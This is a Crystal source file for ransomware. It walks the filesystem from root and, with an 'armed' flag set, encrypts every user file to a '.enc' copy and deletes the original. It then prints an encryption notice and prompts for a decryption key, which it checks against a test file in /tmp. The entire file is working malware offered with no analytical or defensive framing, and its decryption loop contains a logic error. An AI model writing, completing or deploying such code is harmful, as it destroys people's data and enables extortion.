require "./utils/crystal/asem.cr"
require "./utils/crystal/xor.cr"
require "./utils/crystal/safewalk.cr"
require "./utils/crystal/meminfo.cr"

asem = Asem.new
files = [] of String
excludes = [] of String
keypair = {} of String => BigInt

excludes = [
  "/proc", "/sys", "/dev", "/run", "/bin", "/sbin", "/lib", "/lib64",
  "/usr", "/boot", "/efi", "/snap", "/var/lib",
]

ENV["PATH"].split(":").each do |path|
  if !excludes.includes?(path)
    excludes.push(path)
  end
end

# ./utils/crystal/safewalk.cr : safewalk(string, array(string), array(string))
safewalk("/", excludes, files)

# Keys that are replaced during the build!
keypair["public"] = 8129059677996929966_i128.to_big_i
keypair["prime"] = 15992644705724859743_i128.to_big_i

# Test String
testString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"

# The test file
File.write(
  "/tmp/.asem",
  asem.encrypt(testString, keypair["public"], keypair["prime"], false)
)

# Allocate 1/4 of the avaliable memory.
# By checking for what's avaliable and turns into bytes then divided by 4!



armed = true

if armed
  files.each do |path|
    next if File.extname(path) == ".enc"
    # Skip ourselfs
    next if path == Process.executable_path

    begin
      out_buffer = File.open("#{path}.enc", "wb")
      in_buffer = File.open(path, "rb")

      buffer = Bytes.new(256 * 1024)
      loop do
        bytes = in_buffer.read(buffer)
        break if bytes == 0
        chunk = String.new(buffer[0, bytes])
        enc = asem.encrypt(chunk, keypair["public"], keypair["prime"], false)
        out_buffer.write(enc.to_slice)
      end
      # Delete original
      File.delete("#{path}")
    rescue ex
      # puts ex
      # puts ex.backtrace
    end
  end

end



puts("Thank you! #{files.size} files have been encrypted.")

loop do
  print("Decryption key> ")
  key = gets
  break if key.nil?

  parts = key.strip.split(":")
  if parts.size == 2
    begin
      k = BigInt.new(Int128.new(parts[0].gsub(/_i128$/, "")))
      p_ = BigInt.new(Int128.new(parts[1].gsub(/_i128$/, "")))
      


      if File.exists?("/tmp/.asem")
        buff = File.read("/tmp/.asem")
        begin
          if asem.decrypt(buff, k, p_, false) == testString
            puts("Valid decryption key!")
          else
            puts("Invalid decryption key")
            next
          end
        rescue
          puts("Invalid decryption key")
          next
        end
      end

      # Start decryption here
      puts("Please wait as I scan your disk...")
      safewalk("/", excludes, files)
      files.each do |path|
        
        next if !File.extname(path) == ".enc"
        next if path == Process.executable_path
        original_path = path.gsub(/\.enc$/, "")
        puts("Decrypting: #{path} to #{original_path}..")
        begin
          out_buffer = File.open("#{original_path}", "wb")
          in_buffer = File.open(path, "rb")
    
          buffer = Bytes.new(256 * 1024)
          loop do
            bytes = in_buffer.read(buffer)
            break if bytes == 0
            chunk = String.new(buffer[0, bytes])
            enc = asem.decrypt(chunk, k, p_, false)
            out_buffer.write(enc.to_slice)
          end
          # Delete original
          File.delete("#{path}")
        rescue ex
          # puts ex
          # puts ex.backtrace
        end
      end

    rescue e
      puts "Invalid number format: #{e.message}"
    end
  else
    puts "Invalid format. Please use: <key>_i128:<part>_i128"
  end
end
